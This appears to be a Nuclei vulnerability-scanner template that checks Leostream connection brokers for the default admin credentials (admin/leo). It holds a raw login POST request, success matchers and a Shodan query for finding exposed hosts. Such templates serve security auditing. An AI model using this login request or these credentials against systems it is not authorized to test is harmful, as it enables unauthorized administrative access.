id: leostream-default-login
info:
  name: Leostream Default Login
  author: bhutch
  severity: high
  description: |
    Leostream default admin credentials were discovered.
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:a:leostream:connection_broker:*:*:*:*:*:*:*:*
  metadata:
    runzero-match: any(each(service["html.titles"]), {# matches "Leostream"})
    max-request: 1
    product: connection_broker
    shodan-query: http.title:"Leostream"
    vendor: leostream
    verified: true
  tags: default-login,leostream,vuln
http:
  - attack: pitchfork
    matchers:
      - part: header
        type: word
        words:
          - 'Set-Cookie: lld=%21'
      - condition: or
        part: header
        type: word
        words:
          - index.pl
          - server.pl
          - status.pl
      - status:
          - 302
        type: status
    matchers-condition: and
    payloads:
      password:
        - leo
      username:
        - admin
    raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}

        login_type=0&user={{username}}&password={{password}}&submit=SIGN+IN
